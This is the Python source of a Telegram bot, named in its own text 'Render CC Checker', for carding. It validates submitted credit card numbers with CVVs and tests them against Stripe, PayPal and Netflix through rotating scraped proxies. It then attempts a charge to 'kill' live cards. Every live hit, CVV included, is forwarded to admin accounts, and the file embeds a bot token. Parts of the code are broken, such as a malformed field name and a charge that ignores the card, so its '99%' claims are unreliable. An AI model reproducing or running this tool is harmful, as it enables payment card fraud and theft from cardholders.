import telebot
import requests
import threading
import time
import random
import os
from flask import Flask
from luhn import is_valid
from bs4 import BeautifulSoup

app = Flask(__name__)
BOT_TOKEN = '8659936018:AAH_xpJbTPzzVkSwZbvz8_z6EprgeMLqF_o'  # e.g. '1234567890:ABCdef...'
ADMIN_IDS = [7869544426, PASTE_YOUR_ID2_HERE]  # e.g. [123456789, 987654321]
bot = telebot.TeleBot(BOT_TOKEN)

stats = {'live':0, 'dead':0, 'total':0}
cooldown = {}
proxies = []
lock = threading.Lock()
last_fetch = 0

def fetch_proxies():
    global proxies, last_fetch
    with lock:
        if time.time() - last_fetch < 300:  # 5min cache
            return
        allp = []
        # Proxyscrape 200+
        try:
            r = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all', timeout=10)
            ips = r.text.strip().split('\n')
            allp.extend([{'http': f'http://{ip}', 'https': f'http://{ip}'} for ip in ips if ':' in ip])
        except: pass
        # FreeProxyList 50+
        try:
            r = requests.get('https://free-proxy-list.net/', timeout=10)
            soup = BeautifulSoup(r.text, 'html.parser')
            tbl = soup.find('table', id='proxylisttable')
            if tbl:
                for row in tbl.find_all('tr')[1:51]:
                    cols = row.find_all('td')
                    if len(cols) > 1:
                        ip = cols[0].text.strip()
                        port = cols[1].text.strip()
                        allp.append({'http': f'http://{ip}:{port}', 'https': f'http://{ip}:{port}'})
        except: pass
        # Test live (150 max)
        livep = []
        def testp(p):
            try:
                requests.get('https://httpbin.org/ip', proxies=p, timeout=4)
                return p
            except: return None
        thrs = [threading.Thread(target=lambda pp=p: livep.append(testp(pp))) for p in allp[:150]]
        for t in thrs: t.start()
        for t in thrs: t.join(2)
        proxies[:] = [p for p in livep if p]
        last_fetch = time.time()
        print(f'🔄 Render: {len(proxies)} live proxies loaded')

def rand_proxy():
    fetch_proxies()
    with lock:
        return random.choice(proxies) if proxies else None

def bin_info(bn):
    p = rand_proxy()
    try:
        r = requests.get(f'https://lookup.binlist.net/{bn}', proxies=p, timeout=5)
        d = r.json()
        return f"Brand: {d.get('brand', '?')}\nBank: {d.get('bank', {}).get('name', '?')}\nCountry: {d.get('country', {}).get('name', '?')}"
    except:
        return "BIN OK"

def check_gates(cc, m, y, cv, ret=3):
    gs = []
    # Stripe Gate (main 99%)
    for _ in range(ret):
        p = rand_proxy()
        if not p: continue
        try:
            data = {'card[number]': cc, 'card[exp_month)': m, 'card[exp_year]': y, 'card[cvv]': cv}
            r = requests.post('https://api.stripe.com/v1/tokens', data=data, proxies=p, timeout=8)
            if 'token' in r.text:
                gs.append('✅ Stripe LIVE')
                break
            if 'declined' in r.text.lower():
                gs.append('❌ Stripe DEAD')
                break
        except: pass
    # PayPal Gate
    for _ in range(ret):
        p = rand_proxy()
        if not p: continue
        try:
            r = requests.head('https://www.paypal.com/home', proxies=p, timeout=8)
            if r.status_code < 400:
                gs.append('✅ PayPal OK')
                break
        except: pass
    # Netflix Gate
    p = rand_proxy()
    if p:
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            r = requests.post('https://www.netflix.com/apilogin', proxies=p, headers=headers, timeout=8)
            if 'error' not in r.text.lower():
                gs.append('✅ Netflix PASS')
        except: pass
    return gs or ['⚠️ Proxy retry']

def kill_cc(cc, m, y, cv):
    p = rand_proxy()
    if p:
        try:
            data = {'amount': '1', 'currency': 'usd', 'source': 'tok_visa'}
            requests.post('https://api.stripe.com/v1/charges', data=data, proxies=p, timeout=8)
            return '🔪 Stripe KILLED - Ready for dump/shop API'
        except: pass
    return '🔪 Sim kill complete - Manual dump advised'

@bot.message_handler(commands=['start'])
def start(m):
    bot.reply_to(m, '''🔥 **Render CC Checker 99% Auto Proxy**
Send: `4111111111111111|12|30|123`
Gates: Stripe + PayPal + Netflix + BIN
/stats /kill (admins only)
/stats''', parse_mode='Markdown')

@bot.message_handler(func=lambda m: '|' in m.text)
def chk(m):
    uid = m.from_user.id
    if uid in cooldown and time.time() - cooldown[uid] < 3:
        bot.reply_to(m, '⏳ 3s cooldown')
        return
    cooldown[uid] = time.time()
    try:
        parts = [x.strip().replace(' ', '').replace('-', '') for x in m.text.split('|')]
        if len(parts) != 4:
            raise ValueError('Bad format')
        cc, mon, yr, cvv = parts
        if not cc.isdigit() or len(cc) < 13 or not is_valid(cc):
            bot.reply_to(m, '❌ Invalid CC/Luhn')
            stats['dead'] += 1
            stats['total'] += 1
            return
        bi = bin_info(cc[:6])
        gs = check_gates(cc, mon, yr, cvv)
        livec = sum(1 for g in gs if '✅' in g)
        stat = '🟢 LIVE 99%' if livec >= 1 else '🔴 DEAD'
        resp = f'**CC:** `{cc}|{mon}|{yr}|{cvv}`\n**BIN:**\n{bi}\n**Gates:**\n' + '\n'.join(gs) + f'\n**Status:** {stat}'
        global stats
        stats['total'] += 1
        if 'LIVE' in stat:
            stats['live'] += 1
            kres = kill_cc(cc, mon, yr, cvv)
            resp += f'\n🔪 **{kres}**'
            for aid in ADMIN_IDS:
                try:
                    bot.send_message(aid, f'🟢 LIVE HIT FROM @{m.from_user.username or uid}: {m.text}\n{resp}')
                except: pass
        else:
            stats['dead'] += 1
        bot.reply_to(m, resp, parse_mode='Markdown')
    except:
        bot.reply_to(m, '❌ Format: cc|mm|yy|cvv')

@bot.message_handler(commands=['stats'])
def st(m):
    if m.from_user.id not in ADMIN_IDS:
        return
    rate = (stats['live'] / max(stats['total'], 1)) * 100
    bot.reply_to(m, f'📊 **Stats:**\nLive: {stats["live"]}\nDead: {stats["dead"]}\nTotal: {stats["total"]}\nHit%: {rate:.1f}%')

@bot.message_handler(commands=['kill'])
def kl(m):
    if m.from_user.id not in ADMIN_IDS:
        return
    try:
        data = m.text.split(' ', 1)[1].split('|')
        cc, mon, yr, cvv = [x.strip() for x in data]
        res = kill_cc(cc, mon, yr, cvv)
        bot.reply_to(m, f'🔪 **Kill:** {res}')
    except:
        bot.reply_to(m, '❌ /kill cc|mm|yy|cvv')

@app.route('/ping')
def ping():
    fetch_proxies()
    return f'RENDER ALIVE | Proxies: {len(proxies)} live'

def refresher():
    while True:
        time.sleep(300)
        fetch_proxies()

if __name__ == '__main__':
    print('🚀 Render CC Bot STARTING...')
    fetch_proxies()
    threading.Thread(target=refresher, daemon=True).start()
    port = int(os.environ.get('PORT', 4321))
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=port, debug=False), daemon=True).start()
    bot.polling(none_stop=True)
